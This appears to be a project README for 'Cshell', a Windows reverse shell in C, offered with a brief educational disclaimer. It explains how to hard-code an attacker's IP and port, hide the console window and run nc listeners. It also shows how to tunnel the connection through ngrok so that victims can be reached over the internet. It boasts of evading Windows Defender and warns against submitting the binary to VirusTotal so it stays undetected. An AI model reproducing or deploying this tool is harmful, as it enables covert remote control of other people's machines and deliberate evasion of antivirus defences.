# Cshell - Reverse Shell in C

Cshell is a simple reverse shell written in C that connects to a specified IP address and port, allowing an attacker to execute system commands on the victim's machine remotely. This reverse shell leverages the Winsock API on Windows and hides the console window upon execution.
Disclaimer

This project is for educational purposes only.
Use this tool responsibly. Unauthorized access to systems without proper consent is illegal and punishable by law. The author is not responsible for any misuse or damages caused by this program. Make sure you have permission before using this reverse shell on any device or network.

# Important Note:

As of `10/09/2024`, Cshell is undetectable by Windows Defender. However, do not upload the binary or script to sites like VirusTotal, as doing so could lead to its detection being added to antivirus databases, compromising its effectiveness.

# Features

   - Connects to a remote IP address and port over TCP.
   - Executes system commands received from the remote host.
   - Sends the output of the commands back to the remote host.
   - Hides the console window to run silently in the background.
   - Undetectable by Windows Defender as of 10/09/2024.

# How to Compile Cshell

Cshell is designed for Windows and can be compiled using Visual Studio Community Edition. Follow these steps to compile it:
Prerequisites

   1. [Visual Studio Community Edition](https://visualstudio.microsoft.com/vs/community/) (Ensure that the "Desktop development with C++" workload is installed).
   2. [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/) (Should be installed by default with Visual Studio).

# Compilation Steps

   1. Clone or download this repository.
   2. Open the project folder in Visual Studio.
   3. Open the `.sln` (solution) file to load the project.
   4. Edit the `server.sin_addr` line in the source code to hard-code your IP/Hostname and Port:

```c
server.sin_port = htons(4444); // Replace with your port
InetPton(AF_INET, "<IP/Hostname>", &server.sin_addr); // Replace with your IP/Hostname
```

   5. Build the project by selecting Build > Build Solution (or press Ctrl+Shift+B).
   6. The compiled executable will be located in the project's Debug or Release folder.

# Running the Reverse Shell

   1. Host a listener on the specified port. You can use tools like `Netcat` or `Metasploit` to listen for the incoming connection:

```bash
nc -lvnp 4444
```
   2. Replace `4444` with the port you configured in the source code.

   3. Execute the `Cshell.exe` on the target machine. The reverse shell will attempt to connect to the IP address and port hard-coded in the source code.

# Using ngrok for Internet Access

To make the reverse shell accessible over the internet, you can use ngrok to expose a local port to the public internet.

# Steps to Use ngrok:

   1. Download ngrok:

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
```
Or follow the official instructions from [ngrok.com](https://ngrok.com/)

2. Expose Your Local Port: Run the following command to expose the listener port (e.g., `4444`) to the internet:

```bash
ngrok tcp 4444
```

3. `ngrok` will give you a forwarding address (e.g., `tcp://0.tcp.ngrok.io:12345`).

3. Edit the Code: Replace the `<IP/Hostname>` in your code with the forwarding address provided by `ngrok` (e.g., `0.tcp.ngrok.io`) and the port with the one provided (e.g., `12345`):

```c
server.sin_port = htons(12345); // ngrok assigned port
InetPton(AF_INET, "0.tcp.ngrok.io", &server.sin_addr); // ngrok forwarding address
```

4. Run Your Listener: Start a listener on the ngrok-exposed port using `Netcat` or any other reverse shell listener tool:

```bash
nc -lvnp 12345
```
5. Run the Shell: Execute the Cshell.exe on the target machine. It will now connect through ngrok, allowing you to get a reverse shell over the internet.

# Security Considerations

Be aware that running reverse shells can expose vulnerabilities in the systems they target. Always secure your systems and use such tools ethically. For more advanced usage, consider implementing encryption or authentication mechanisms to secure the connection.

# License

This project is licensed under the MIT License. See the LICENSE file for more details.
